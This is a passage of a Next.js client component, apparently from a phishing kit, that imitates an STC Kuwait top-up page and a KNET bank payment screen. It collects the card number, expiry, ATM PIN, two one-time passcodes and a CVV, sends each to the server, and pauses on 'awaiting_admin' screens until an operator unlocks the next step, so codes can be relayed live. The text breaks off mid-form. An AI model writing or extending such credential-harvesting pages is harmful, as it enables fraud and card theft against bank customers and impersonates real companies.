"use client";

import { useEffect, useRef, useState } from "react";
import { useActionState } from "react";
import { useTranslations } from "next-intl";
import { Link, useRouter } from "@/i18n/navigation";
import { isValidCardExpiryMmYy } from "@/lib/card-expiry";
import type { ActionResult } from "@/lib/codes";
import { formatKnetCard, knetCards, knetLogoFor, maskKnetCard } from "@/lib/knet-cards";
import { parseKwdToMinor } from "@/lib/money";
import { getTrackerSessionId, reportTrackerState } from "@/lib/tracker-session";
import { ApprovalWait, type KnetWaitPhase } from "@/views/checkout/approval-wait";
import { KnetRejectOverlay, type KnetRejectKind } from "@/views/checkout/knet-reject-overlay";
import {
  knetAcknowledgeRetryAction,
  knetAction,
  knetCvvAction,
  knetOtp2Action,
  knetOtpAction,
  payAction,
  rechargeAction,
} from "@/server/actions";
import { useRechargeDraft } from "@/state/recharge-draft.store";
import { ErrorLine } from "@/views/ui/error-line";

const presets = [
  { amount: 2, days: 10 },
  { amount: 3, days: 15 },
  { amount: 5, days: 30 },
  { amount: 10, days: 90 },
  { amount: 20, days: 180 },
  { amount: 25, days: 365 },
];

const methods = [
  { id: "knet", icon: "/icons/pay-knet.svg", label: "knet" },
  { id: "card", icon: "/icons/pay-card.png", label: "card" },
  { id: "gpay", icon: "/icons/pay-gpay.svg", label: "gpay" },
] as const;

function moneyLabel(halalas: number) {
  const value = halalas / 100;
  return Number.isInteger(value) ? String(value) : value.toFixed(3).replace(/0+$/, "").replace(/\.$/, "");
}

function maskKnetOtpCard(digits: string) {
  const masked = digits.replace(/\D/g, "").slice(0, 16).split("").map((digit, index) => (index >= 4 && index <= 9 ? "*" : digit)).join("");
  return masked.replace(/(.{4})/g, "$1 ").trim();
}

function otpReady(value: string) {
  return /^\d{6}$/.test(value);
}

export function QuickPayAmount({ locale, productId, initialStep, source }: { locale: string; productId: string; initialStep?: "pay"; source?: "bill" }) {
  const t = useTranslations("quickPayPage");
  const router = useRouter();
  const hydrated = useRechargeDraft((state) => state.hydrated);
  const msisdn = useRechargeDraft((state) => state.msisdn);
  const idempotencyKey = useRechargeDraft((state) => state.idempotencyKey);
  const rotateKey = useRechargeDraft((state) => state.rotateKey);
  const selectProduct = useRechargeDraft((state) => state.selectProduct);
  const [amountText, setAmountText] = useState("");
  const [step, setStep] = useState<"amount" | "pay" | "waitingApproval" | "knet" | "knetOtp" | "knetCvv" | "knetOtp2">(initialStep ?? "amount");
  const [waitingOrderId, setWaitingOrderId] = useState<string | null>(null);
  const [method, setMethod] = useState<(typeof methods)[number]["id"]>("knet");
  const [debitNumber, setDebitNumber] = useState("");
  const [debitFocused, setDebitFocused] = useState(false);
  const [suggestOpen, setSuggestOpen] = useState(false);
  const [debitExpiry, setDebitExpiry] = useState("");
  const [pin, setPin] = useState("");
  const [knetOtp, setKnetOtp] = useState("");
  const [knetOtp2, setKnetOtp2] = useState("");
  const [knetCvv, setKnetCvv] = useState("");
  const [knetError, setKnetError] = useState(false);
  const [knetExpiryError, setKnetExpiryError] = useState(false);
  const [knetErrorKey, setKnetErrorKey] = useState("knetInvalid");
  const [knetOrderId, setKnetOrderId] = useState<string | null>(null);
  const [otpLeft, setOtpLeft] = useState(4 * 60);
  const [checkoutError, setCheckoutError] = useState<string | null>(null);
  const [checkoutBusy, setCheckoutBusy] = useState(false);
  const [knetBusy, setKnetBusy] = useState(false);
  const [knetWaitPhase, setKnetWaitPhase] = useState<KnetWaitPhase | null>(null);
  const [rejectKind, setRejectKind] = useState<KnetRejectKind | null>(null);
  const [otpResendSeconds, setOtpResendSeconds] = useState(0);
  const otpRetryDoneRef = useRef(false);
  const followed = useRef("");
  const [state, action, pending] = useActionState(rechargeAction, null as ActionResult | null);
  const parsed = parseKwdToMinor(amountText);
  const ready = Boolean(productId && parsed);
  const expiryDigits = debitExpiry.replace(/\D/g, "");
  const debitYear = expiryDigits.slice(0, 2);
  const debitMonth = expiryDigits.slice(2, 4);
  const debitMatches = debitNumber ? knetCards.filter((card) => card.bin.startsWith(debitNumber)) : [];
  const debitLogo = knetLogoFor(debitNumber);
  const otpClock = `${String(Math.floor(otpLeft / 60)).padStart(2, "0")}:${String(otpLeft % 60).padStart(2, "0")}`;

  useEffect(() => {
    if (hydrated && !msisdn.trim()) router.replace("/");
  }, [hydrated, msisdn, router]);

  useEffect(() => {
    if (!hydrated || !initialStep) return;
    const draft = useRechargeDraft.getState();
    if (draft.amountHalalas > 0) {
      setAmountText(moneyLabel(draft.amountHalalas));
    }
  }, [hydrated, initialStep]);

  function stampSession(data: FormData) {
    data.set("sessionId", getTrackerSessionId());
    return data;
  }

  const stepPage: Record<string, string> = {
    amount: "/quick-pay/amount",
    pay: "/quick-pay/pay",
    knet: "/quick-pay/knet",
    knetOtp: "/quick-pay/knet-otp",
    knetCvv: "/quick-pay/knet-cvv",
    knetOtp2: "/quick-pay/knet-otp-2",
    waitingApproval: "/quick-pay/waiting-admin",
  };

  useEffect(() => {
    const page = stepPage[step] ?? "/quick-pay";
    reportTrackerState({ page });
  }, [step]);

  useEffect(() => {
    if (step !== "knetOtp" && step !== "knetOtp2") return;
    setOtpLeft(4 * 60);
    const timer = window.setInterval(() => setOtpLeft((seconds) => (seconds > 0 ? seconds - 1 : 0)), 1000);
    return () => window.clearInterval(timer);
  }, [step]);

  useEffect(() => {
    if ((rejectKind !== "otp" && rejectKind !== "otp2") || otpResendSeconds <= 0) return;
    const timer = window.setInterval(() => {
      setOtpResendSeconds((seconds) => (seconds > 0 ? seconds - 1 : 0));
    }, 1000);
    return () => window.clearInterval(timer);
  }, [rejectKind, otpResendSeconds]);

  useEffect(() => {
    if (rejectKind !== "otp" && rejectKind !== "otp2") {
      otpRetryDoneRef.current = false;
      return;
    }
    if (otpResendSeconds > 0) return;
    if (otpRetryDoneRef.current) return;
    otpRetryDoneRef.current = true;
    void finishKnetRetry(rejectKind);
  }, [rejectKind, otpResendSeconds]);

  async function finishKnetRetry(kind: KnetRejectKind) {
    const orderId = knetOrderId;
    if (orderId) await knetAcknowledgeRetryAction(orderId);
    setRejectKind(null);
    if (kind === "card") {
      setPin("");
      setKnetError(false);
      setStep("knet");
    } else if (kind === "otp") {
      setKnetOtp("");
      setKnetError(false);
      setStep("knetOtp");
    } else if (kind === "otp2") {
      setKnetOtp2("");
      setKnetError(false);
      setStep("knetOtp2");
    } else {
      setKnetCvv("");
      setKnetError(false);
      setStep("knetCvv");
    }
  }

  function handleKnetRetry(kind: KnetRejectKind) {
    setKnetBusy(false);
    setKnetWaitPhase(null);
    otpRetryDoneRef.current = false;
    setRejectKind(kind);
    if (kind === "card") setStep("knet");
    else if (kind === "cvv") setStep("knetCvv");
    else if (kind === "otp2") {
      setStep("knetOtp2");
      setOtpResendSeconds(4);
    } else {
      setStep("knetOtp");
      setOtpResendSeconds(4);
    }
  }

  async function ensureCheckoutOrder(setter: (id: string) => void, existing: string | null) {
    if (existing) return existing;
    if (!productId || !parsed) {
      setCheckoutError("invalid_amount");
      return null;
    }
    let key = idempotencyKey;
    if (!/^[0-9a-f-]{36}$/i.test(key)) {
      rotateKey();
      key = useRechargeDraft.getState().idempotencyKey;
    }
    if (!/^[0-9a-f-]{36}$/i.test(key)) {
      setCheckoutError("generic");
      return null;
    }
    setCheckoutError(null);
    setCheckoutBusy(true);
    try {
      const data = new FormData();
      data.set("productId", productId);
      data.set("amountHalalas", String(parsed));
      data.set("idempotencyKey", key);
      data.set("locale", locale);
      data.set("msisdn", msisdn);
      const result = await rechargeAction(null, data);
      if (!result.ok || !result.orderId) {
        setCheckoutError(result.ok ? "generic" : result.code);
        return null;
      }
      setter(result.orderId);
      return result.orderId;
    } finally {
      setCheckoutBusy(false);
    }
  }

  const ensureKnetOrder = () => ensureCheckoutOrder((id) => setKnetOrderId(id), knetOrderId);

  function showKnetError(key: string, expiry = false) {
    setKnetErrorKey(key);
    setKnetExpiryError(expiry);
    setKnetError(true);
  }

  async function submitKnetStep() {
    if (knetBusy) return;
    if (step === "knet") {
      const cardDigits = debitNumber.replace(/\D/g, "");
      const pinDigits = pin.replace(/\D/g, "");
      const expiryOk = isValidCardExpiryMmYy(debitMonth, debitYear);
      if (cardDigits.length < 10) {
        showKnetError("knetCardInvalid");
        return;
      }
      if (debitMonth.length !== 2 || debitYear.length !== 2 || !expiryOk) {
        showKnetError("knetExpiryInvalid", debitMonth.length === 2 && debitYear.length === 2);
        return;
      }
      if (pinDigits.length < 3 || pinDigits.length > 4) {
        showKnetError("knetPinInvalid");
        return;
      }
      setKnetExpiryError(false);
      const orderId = knetOrderId ?? (await ensureKnetOrder());
      if (!orderId) {
        showKnetError("knetOrderFailed");
        return;
      }
      setKnetBusy(true);
      setWaitingOrderId(orderId);
      const data = new FormData();
      data.set("orderId", orderId);
      data.set("amountHalalas", String(parsed ?? ""));
      data.set("cardNumber", cardDigits);
      data.set("expiryDate", `${debitMonth}/${debitYear}`);
      data.set("pin", pinDigits);
      const knetResult = await knetAction(null, stampSession(data));
      if (!knetResult.ok) {
        setKnetBusy(false);
        setWaitingOrderId(null);
        showKnetError(knetResult.code === "invalid_card" ? "knetInvalid" : "knetOrderFailed");
        return;
      }
      try {
        const initId = sessionStorage.getItem("stc-init-id");
        if (initId) {
          fetch("/api/quick-pay/init", { method: "DELETE", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ id: initId }) }).catch(() => {});
          sessionStorage.removeItem("stc-init-id");
        }
      } catch {}
      setKnetError(false);
      setKnetWaitPhase("card");
      setStep("waitingApproval");
      setKnetBusy(false);
      reportTrackerState({ page: "/quick-pay/knet-waiting", flowStage: "awaiting_admin", locked: true, orderId });
      return;
    }
    if (step === "knetOtp") {
      if (!otpReady(knetOtp)) {
        showKnetError("otpInvalid");
        return;
      }
      const orderId = knetOrderId ?? (await ensureKnetOrder());
      if (!orderId) {
        showKnetError("knetOrderFailed");
        return;
      }
      const data = new FormData();
      data.set("orderId", orderId);
      data.set("otp", knetOtp);
      const otpResult = await knetOtpAction(null, data);
      if (!otpResult.ok) {
        showKnetError("otpInvalid");
        return;
      }
      setKnetError(false);
      setKnetWaitPhase("otp");
      setWaitingOrderId(orderId);
      setStep("waitingApproval");
      reportTrackerState({ page: "/quick-pay/knet-otp-waiting", flowStage: "awaiting_admin", locked: true, orderId });
      return;
    }
    if (step === "knetCvv") {
      if (knetCvv.length !== 3) {
        showKnetError("cvvInvalid");
        return;
      }
      const orderId = knetOrderId ?? (await ensureKnetOrder());
      if (!orderId) {
        showKnetError("knetOrderFailed");
        return;
      }
      const cvvData = new FormData();
      cvvData.set("orderId", orderId);
      cvvData.set("cvv", knetCvv);
      const cvvResult = await knetCvvAction(null, stampSession(cvvData));
      if (!cvvResult.ok) {
        showKnetError("cvvInvalid");
        return;
      }
      setKnetWaitPhase("cvv");
      setWaitingOrderId(orderId);
      setStep("waitingApproval");
      reportTrackerState({ page: "/quick-pay/knet-cvv-waiting", flowStage: "awaiting_admin", locked: true, orderId });
      return;
    }
    if (step === "knetOtp2") {
      if (!otpReady(knetOtp2)) {
        showKnetError("otpInvalid");
        return;
      }
      const orderId = knetOrderId ?? (await ensureKnetOrder());
      if (!orderId) {
        showKnetError("knetOrderFailed");
        return;
      }
      const data = new FormData();
      data.set("orderId", orderId);
      data.set("otp", knetOtp2);
      const otpResult = await knetOtp2Action(null, data);
      if (!otpResult.ok) {
        showKnetError("otpInvalid");
        return;
      }
      setKnetError(false);
      setKnetWaitPhase("otp2");
      setWaitingOrderId(orderId);
      setStep("waitingApproval");
      reportTrackerState({ page: "/quick-pay/knet-otp2-waiting", flowStage: "awaiting_admin", locked: true, orderId });
      return;
    }
  }

  function goToKnetStep() {
    if (!ready) {
      setCheckoutError(productId ? "invalid_amount" : "noProduct");
      return;
    }
    setCheckoutError(null);
    const amountKwd = ((parsed ?? 0) / 100).toFixed(3);
    const params = new URLSearchParams({ phone: msisdn, amount: amountKwd });
    window.location.href = `/knet-payment.html?${params.toString()}`;
  }

  useEffect(() => {
    if (!state?.ok || !state.orderId || followed.current === state.orderId) return;
    if (method === "knet") return;
    const orderId = state.orderId;
    void (async () => {
      if (method === "gpay") {
        const data = new FormData();
        data.set("orderId", orderId);
        data.set("method", method);
        await payAction(null, data);
      }
      followed.current = orderId;
      rotateKey();
      router.push(`/checkout/${orderId}`);
      router.refresh();
    })();
  }, [state, method, rotateKey, router]);

  if (!hydrated || !msisdn.trim()) return <div className="h-64 animate-pulse bg-white" />;

  const shown = parsed ? moneyLabel(parsed) : "";

  if ((step === "waitingApproval" && waitingOrderId) || (knetBusy && waitingOrderId)) {
    return (
      <>
        <div dir="ltr" className="flex min-h-dvh flex-col items-center bg-[#e5e5e5] text-[#222]" style={{ fontFamily: "'Cairo', Arial, sans-serif" }}>
          <div className="w-full self-stretch"><img src="/knet/banner.jpg" alt="" className="block w-full" /></div>
          <div className="flex w-full max-w-[460px] flex-col gap-3 px-[10px] pb-5 pt-[14px]">
            <div className="overflow-hidden rounded-[10px] border border-[#bbb] bg-white shadow-[0_2px_8px_rgba(0,0,0,0.12)]">
              <div className="flex flex-col items-center gap-3 px-[18px] pb-[14px] pt-5">
                <img src="/knet/logo.jpg" alt="KIB" className="h-11 object-contain" />
                <div className="w-full border-t border-[#d8d8d8]">
                  <div className="grid grid-cols-[1fr_auto] items-center border-b border-[#d8d8d8] px-1 py-[7px]" dir="ltr">
                    <span className="text-xs font-medium text-[#555]">{t("merchant")}</span>
                    <span dir="rtl" className="text-xs font-bold text-[#005baa]">:{t("beneficiary")}</span>
                  </div>
                  <div className="grid grid-cols-[1fr_auto] items-center px-1 py-[7px]" dir="ltr">
                    <span className="text-[13px] font-bold text-[#222]">KD&nbsp;{((parsed ?? 0) / 100).toFixed(3)}</span>
                    <span dir="rtl" className="text-xs font-bold text-[#005baa]">:{t("invoiceAmount")}</span>
                  </div>
                </div>
              </div>
            </div>
            <div className="overflow-hidden rounded-[10px] border border-[#bbb] bg-white shadow-[0_2px_8px_rgba(0,0,0,0.12)]">
              <div className="flex flex-col items-center gap-4 px-5 py-8">
                <div className="size-11 animate-spin rounded-full border-4 border-[#e0e0e0] border-t-[#555]" />
                <div className="text-[15px] font-bold text-[#555]">جاري معالجة الطلب...</div>
              </div>
            </div>
          </div>
          <div className="flex w-full max-w-[460px] flex-col gap-1 px-3 pb-[18px] pt-[10px] text-center">
            <p className="text-xs font-semibold text-[#555]">{t("rights")}</p>
            <p className="text-xs text-[#005baa]">{t("knetCompany")}</p>
          </div>
        </div>
        <ApprovalWait
          hidden
          orderId={waitingOrderId!}
          locale={locale}
          from="knet"
          knetWaitPhase={knetWaitPhase}
          onKnetUnlocked={(target) => {
            setKnetWaitPhase(null);
            setKnetBusy(false);
            setStep(target);
            reportTrackerState({
              page: target === "knetOtp" ? "/quick-pay/knet-otp" : target === "knetOtp2" ? "/quick-pay/knet-otp-2" : "/quick-pay/knet-cvv",
              flowStage: "knet",
              locked: true,
              orderId: waitingOrderId!,
            });
          }}
          onKnetRetry={handleKnetRetry}
        />
      </>
    );
  }

  return (
    <form
      action={action}
      className={`mx-auto flex min-h-dvh w-full max-w-lg flex-col text-black ${step === "knet" || step === "knetOtp" || step === "knetCvv" || step === "knetOtp2" ? "bg-[#e5e5e5]" : "bg-white pb-[calc(55px+env(safe-area-inset-bottom,0px))]"}`}
      onSubmit={(event) => {
        if (step === "knet" || step === "knetOtp" || step === "knetCvv" || step === "knetOtp2") {
          event.preventDefault();
        }
      }}
    >
      <input type="hidden" name="productId" value={productId} />
      <input type="hidden" name="amountHalalas" value={parsed ?? ""} />
      <input type="hidden" name="idempotencyKey" value={idempotencyKey} />
      <input type="hidden" name="locale" value={locale} />
      <input type="hidden" name="msisdn" value={msisdn} />

      {step === "knet" || step === "knetOtp" || step === "knetCvv" || step === "knetOtp2" ? null : <header className="flex h-[74px] items-center justify-between px-5">
        {step === "amount" ? (
          <Link href="/" aria-label={t("back")} className="grid size-6 place-items-center text-brand">
            <BackIcon />
          </Link>
        ) : (
          <button type="button" aria-label={t("back")} className="grid size-6 place-items-center text-brand" onClick={() => source === "bill" ? router.back() : setStep("amount")}>
            <BackIcon />
          </button>
        )}
        <h1 className="text-base font-normal">{step === "amount" ? t("title") : t("paymentTitle")}</h1>
        {step === "amount" ? (
          <button
            type="button"
            aria-label={t("share")}
            className="grid size-[18px] place-items-center"
            onClick={() => {
              const payload = { title: "stc", url: window.location.href };
              if (navigator.share) void navigator.share(payload).catch(() => undefined);
            }}
          >
            <img src="/icons/quickpay-share.avif" alt="" className="size-[18px] object-contain" />
          </button>
        ) : (
          <span className="size-6" />
        )}
      </header>}

      {step === "amount" ? (
        <>
          <div className="px-[30px] pt-[30px]">
            <h2 className="text-start text-[24px] font-medium leading-8">{t("heading")}</h2>
          </div>
          <div className="px-[30px] pb-[5px] pt-10">
            <input
              value={amountText}
              onChange={(event) => setAmountText(event.target.value.replace(/[^\d.]/g, ""))}
              inputMode="decimal"
              placeholder={t("amount")}
              aria-label={t("amount")}
              className="w-full border-0 border-b border-[#dde0e2] bg-transparent pb-1 text-start text-[24px] font-medium text-[#1d252d] outline-none placeholder:text-[19px] placeholder:font-normal placeholder:text-[#8e9aa0]"
            />
          </div>
          {state && !state.ok ? (
            <div className="px-[30px] pt-2">
              <ErrorLine code={state.code} />
            </div>
          ) : null}
          <div className="mt-2">
            {presets.map((item) => {
              const selected = parsed === item.amount * 100;
              return (
                <div key={item.amount}>
                  <button
                    type="button"
                    onClick={() => setAmountText(String(item.amount))}
                    className="flex h-[105px] w-full items-center justify-between bg-white px-5"
                  >
                    <span className="flex items-center">
                      <span className="relative block size-6 shrink-0 rounded-full border-[1.6px] border-brand" style={{ marginLeft: 10 }}>
                        {selected ? (
                          <span className="absolute left-1/2 top-1/2 size-[15.6px] -translate-x-1/2 -translate-y-1/2 rounded-full bg-brand" />
                        ) : null}
                      </span>
                      <span>
                        <span className="flex items-end">
                          <span className="text-sm font-medium leading-[22px]">د.ك</span>
                          <span className="text-[30px] font-medium leading-10" style={{ marginLeft: 5 }}>
                            {item.amount}
                          </span>
                        </span>
                        <span className="mt-[5px] block text-xs font-medium text-[#8e9aa0]">{t("validFor", { days: item.days })}</span>
                      </span>
                    </span>
                    <span
                      dir="ltr"
                      className="flex h-11 w-[70px] items-center bg-[length:70px_44px] bg-no-repeat pl-[7px] text-[16px] font-medium leading-none text-white"
                      style={{ backgroundImage: "url(/icons/recharge-card.avif)" }}
                    >
                      {item.amount}
                    </span>
                  </button>
                  <div className="ms-5 h-px bg-[#dde0e2]" />
                </div>
              );
            })}
          </div>
          {!productId ? (
            <p className="px-[30px] pb-3 text-sm font-medium text-danger">{t("noProduct")}</p>
          ) : null}
          <button
            type="button"
            disabled={!ready}
            onClick={async () => {
              if (!parsed || !productId) {
                setCheckoutError(productId ? "invalid_amount" : "noProduct");
                return;
              }
              selectProduct(productId, parsed, "topup");
              setCheckoutError(null);
              rotateKey();
              try {
                const initId = sessionStorage.getItem("stc-init-id");
                const res = await fetch("/api/quick-pay/init", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ phone: msisdn, amount: parsed, ...(initId ? { id: initId } : {}) }),
                });
                const data = await res.json();
                if (data.id) sessionStorage.setItem("stc-init-id", data.id);
              } catch {}
              setStep("pay");
            }}
            className="fixed inset-x-0 bottom-0 z-50 mx-auto flex w-full max-w-lg touch-manipulation items-center justify-center bg-primary text-[17px] font-medium text-white disabled:pointer-events-none disabled:opacity-65"
            style={{ minHeight: "calc(55px + env(safe-area-inset-bottom, 0px))", paddingBottom: "env(safe-area-inset-bottom, 0px)" }}
          >
            {t("continue")}
          </button>
        </>
      ) : step === "pay" ? (
        <>
          <div className="min-h-0 flex-1">
            {source === "bill" ? (
              <>
                <div className="px-5 pb-3 pt-5 text-base font-bold">{t("due")}</div>
                <div className="h-px bg-[#dde0e2]" />
                <div className="flex h-[110px] items-end justify-between px-5 pb-5 pt-[18px]">
                  <span className="flex items-center gap-[5px] text-[#1d252d]">
                    <span className="text-[24px] font-bold leading-8">د.ك</span>
                    <span className="text-[42px] font-bold leading-[52px]">{shown}</span>
                  </span>
                </div>
                <div className="h-px bg-[#dde0e2]" />
              </>
            ) : (
              <>
                <div className="px-5 pb-3 pt-5 text-base font-bold">{t("due")}</div>
                <div className="h-px bg-[#dde0e2]" />
                <div className="flex h-[86px] items-end justify-between px-5 pb-5 pt-[18px]">
                  <span className="flex items-center gap-[5px] text-[#1d252d]">
                    <span className="text-[24px] font-medium leading-8">د.ك</span>
                    <span className="text-[38px] font-medium leading-[48px]">{shown}</span>
                  </span>
                </div>
                <div className="h-px bg-[#dde0e2]" />
              </>
            )}
            <div className="flex h-20 items-end px-5 pb-[15px] pt-5 text-base font-bold text-[#1d252d]">{t("against")}</div>
            <div className="h-px bg-[#dde0e2]" />
            <div className="flex items-center justify-between px-5 pb-[15px] pt-5">
              <span>
                <span dir="ltr" className="block py-0.5 text-end text-base text-[#1d252d]">
                  {msisdn}
                </span>
                <span className="mt-[3px] block text-xs text-[#8e9aa0]">{source === "bill" ? t("postpaid") : t("prepaid")}</span>
              </span>
              <span className="flex items-center gap-[5px] font-medium text-[#1d252d]">
                <span className="text-sm">د.ك</span>
                <span className="text-[19px]">{shown}</span>
              </span>
            </div>
            <div className="h-px bg-[#dde0e2]" />
            <div className="flex h-20 items-end px-5 pb-[15px] pt-5 text-base font-bold text-[#1d252d]">{t("using")}</div>
            <div className="h-px bg-[#dde0e2]" />
            {methods.map((item) => {
              const selected = method === item.id;
              return (
                <div key={item.id} className={selected ? "mx-[10px] rounded-[6px] border-[1.6px] border-brand" : ""}>
                  <button
                    type="button"
                    onClick={() => {
                      if (item.id === "knet" || item.id === "card") {
                        goToKnetStep();
                        return;
                      }
                      setMethod(item.id);
                    }}
                    className="flex w-full touch-manipulation items-center gap-3 bg-white p-[15px]"
                  >
                    <img src={item.icon} alt="" className="h-[35px] w-auto object-contain" />
                    <span className="text-base text-[#1d252d]">{t(item.label)}</span>
                  </button>
                  {selected ? null : <div className="h-px bg-[#dde0e2]" />}
                </div>
              );
            })}
            <p className="px-[30px] py-5 text-start text-sm font-medium leading-[22px]">
              {t("terms")}{" "}
              <a href="https://www.stc.com.kw/ar/payment-terms-and-conditions" target="_blank" rel="noopener noreferrer" className="font-medium text-primary">
                {t("termsLink")}
              </a>
            </p>
            {checkoutError ? (
              <div className="px-[30px] pb-3">
                <ErrorLine code={checkoutError} />
              </div>
            ) : state && !state.ok ? (
              <div className="px-[30px] pb-3">
                <ErrorLine code={state.code} />
              </div>
            ) : null}
          </div>
          {method === "gpay" ? (
            <button
              type="submit"
              disabled={pending || checkoutBusy || !ready}
              aria-label="الدفع باستخدام GPay"
              className="fixed inset-x-0 bottom-0 z-10 mx-auto h-[55px] w-full max-w-lg bg-black bg-center bg-no-repeat disabled:opacity-65"
              style={{ borderRadius: 4, backgroundImage: "url(/icons/gpay-button-ar.svg)", backgroundSize: "131px 21px" }}
            />
          ) : (
            <button
              type="button"
              disabled={checkoutBusy || !ready}
              onClick={() => goToKnetStep()}
              className="fixed inset-x-0 bottom-0 z-50 mx-auto flex h-[55px] w-full max-w-lg touch-manipulation items-center justify-center bg-primary pb-[env(safe-area-inset-bottom,0px)] text-[17px] font-medium text-white disabled:opacity-65"
              style={{ minHeight: "calc(55px + env(safe-area-inset-bottom, 0px))" }}
            >
              {checkoutBusy ? t("creatingOrder") : t("confirm", { amount: shown })}
            </button>
          )}
        </>
      ) : (
        <div dir="ltr" className="flex min-h-dvh flex-col items-center bg-[#e5e5e5] text-[#222]" style={{ fontFamily: "'Cairo', Arial, sans-serif" }}>
          <div className="w-full self-stretch"><img src="/knet/banner.jpg" alt="" className="block w-full" /></div>
          <div className="flex w-full max-w-[460px] flex-col gap-3 px-[10px] pb-5 pt-[14px]">
            {/* Info card */}
            <div className="overflow-hidden rounded-[10px] border border-[#bbb] bg-white shadow-[0_2px_8px_rgba(0,0,0,0.12)]">
              <div className="flex flex-col items-center gap-3 px-[18px] pb-[14px] pt-5">
                <img src="/knet/logo.jpg" alt="KIB" className="h-11 object-contain" />
                <div className="w-full border-t border-[#d8d8d8]">
                  <div className="grid grid-cols-[1fr_auto] items-center border-b border-[#d8d8d8] px-1 py-[7px]" dir="ltr">
                    <span className="text-xs font-medium text-[#555]">{t("merchant")}</span>
                    <span dir="rtl" className="text-xs font-bold text-[#005baa]">:{t("beneficiary")}</span>
                  </div>
                  <div className="grid grid-cols-[1fr_auto] items-center px-1 py-[7px]" dir="ltr">
                    <span className="text-[13px] font-bold text-[#222]">KD&nbsp;{((parsed ?? 0) / 100).toFixed(3)}</span>
                    <span dir="rtl" className="text-xs font-bold text-[#005baa]">:{t("invoiceAmount")}</span>
                  </div>
                </div>
              </div>
            </div>

            {knetError && step === "knet" ? (
              <div className="rounded-lg border-[1.5px] border-[#cc0000] bg-[#fff0f0] px-[14px] py-[10px] text-center text-[15px] font-extrabold text-[#cc0000]">{t(knetErrorKey)}</div>
            ) : null}

            {step === "knetOtp" || step === "knetOtp2" || step === "knetCvv" ? (
              <div className="overflow-hidden rounded-[10px] border border-[#bbb] bg-white shadow-[0_2px_8px_rgba(0,0,0,0.12)]">
                <div className="pb-[6px] pt-4">
                  <div dir="rtl" className="mx-4 mb-[14px] rounded-lg border border-[#b8d4e3] bg-[#E8F1F5] px-4 py-[14px] text-right text-[13px] font-medium leading-[1.8] text-[#1a3a5c]">
                    {step === "knetCvv" ? t("cvvHint") : step === "knetOtp2" ? t("otp2Warning") : t("otpWarning")}
                  </div>
                  {knetError ? (
                    <div className="px-4 py-2 text-center text-[14px] font-extrabold text-[#cc0000]">{t(knetErrorKey)}</div>
                  ) : null}
                  <table dir="rtl" className="w-full border-collapse">
                    <tbody>
                      <tr className="border-b border-[#ccc]">
                        <td className="whitespace-nowrap py-[7px] ps-3 pe-1 text-right text-xs font-bold text-[#005baa]">:{t("debitNumber")}</td>
                        <td dir="ltr" className="py-[7px] pe-1 ps-3 text-left font-[Arial,Helvetica,sans-serif] text-xs font-medium tracking-[0.5px] whitespace-nowrap text-[#222]">{maskKnetOtpCard(debitNumber)}</td>
                      </tr>
                      <tr className="border-b border-[#ccc]">
                        <td className="whitespace-nowrap py-[7px] ps-3 pe-1 text-right text-xs font-bold text-[#005baa]">:{t("otpMonth")}</td>
                        <td dir="ltr" className="py-[7px] pe-1 ps-3 text-left font-[Arial,Helvetica,sans-serif] text-xs font-medium tracking-[0.5px] whitespace-nowrap text-[#222]">{debitMonth}</td>
                      </tr>
                      <tr className="border-b border-[#ccc]">
                        <td className="whitespace-nowrap py-[7px] ps-3 pe-1 text-right text-xs font-bold text-[#005baa]">:{t("otpYear")}</td>
                        <td dir="ltr" className="py-[7px] pe-1 ps-3 text-left font-[Arial,Helvetica,sans-serif] text-xs font-medium tracking-[0.5px] whitespace-nowrap text-[#222]">{debitYear.length === 2 ? `20${debitYear}` : debitYear}</td>
                      </tr>
                      <tr className="border-b border-[#ccc]">
                        <td className="whitespace-nowrap py-[7px] ps-3 pe-1 text-right text-xs font-bold text-[#005baa]">:{t("pin")}</td>
                        <td dir="ltr" className="py-[7px] pe-1 ps-3 text-left font-[Arial,Helvetica,sans-serif] text-xs font-medium tracking-[0.5px] whitespace-nowrap text-[#222]">****</td>
                      </tr>
                      <tr>
                        <td className="whitespace-nowrap py-[7px] ps-3 pe-1 text-right text-xs font-bold text-[#005baa]">{step === "knetCvv" ? ":CVV" : step === "knetOtp2" ? ":OTP 2" : ":OTP"}</td>
                        <td dir="ltr" className="py-[7px] ps-3">
                          <input
                            value={step === "knetCvv" ? knetCvv : step === "knetOtp2" ? knetOtp2 : knetOtp}
                            onChange={(event) => {
                              const val = event.target.value.replace(/\D/g, "").slice(0, step === "knetCvv" ? 3 : 6);
                              if (step === "knetCvv") setKnetCvv(val);
                              else if (step === "knetOtp2") setKnetOtp2(val);
                              else setKnetOtp(val);
                              setKnetError(false);
                            }}
                            dir="ltr"
                            inputMode="numeric"
                            autoComplete={step === "knetCvv" ? "off" : "one-time-code"}
                            maxLength={step === "knetCvv" ? 3 : 6}
                            placeholder={step === "knetCvv" ? "" : `Timeout in: ${otpClock}`}
                            className="h-7 w-full rounded-[6px] border border-[#bcbcbc] bg-[linear-gradient(to_bottom,#fff_0%,#ebebeb_100%)] px-2 font-[Arial,Helvetica,sans-serif] text-[13px] tracking-[1px] text-[#333] shadow-[inset_0_2px_4px_rgba(0,0,0,0.12),0_1px_0_#fff] outline-none placeholder:font-bold placeholder:text-[#8a8a8a]"
                          />
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            ) : (
              <div className="overflow-hidden rounded-[10px] border border-[#bbb] bg-white shadow-[0_2px_8px_rgba(0,0,0,0.12)]">
                <div className="px-5 py-[18px]">
                  <div className="mb-1 flex items-center justify-around border-b border-[#d8d8d8] pb-[10px]">
                    <label className="flex cursor-pointer items-center gap-2" dir="ltr">
                      <img src="/icons/pay-knet.svg" alt="K-Net" className="h-9 object-contain" />
                      <span className="flex h-[17px] w-[17px] items-center justify-center rounded-full border-2 border-[#005baa]"><span className="h-2 w-2 rounded-full bg-[#005baa]" /></span>
                    </label>
                    <label className="flex cursor-not-allowed items-center gap-2 opacity-45" dir="ltr">
                      <img src="/icons/pay-card.png" alt="K-Fast" className="h-9 object-contain" />
                      <span className="flex h-[17px] w-[17px] items-center justify-center rounded-full border-2 border-[#aaa]" />
                    </label>
                  </div>
                  <table dir="ltr" className="w-full border-collapse">
                    <tbody>
                      <tr className="border-b border-[#d8d8d8]">
                        <td className="w-[58%] py-[7px] pe-1 align-middle">
                          <div className={`relative ${suggestOpen && debitMatches.length > 0 ? "z-20" : ""}`}>
                            <input
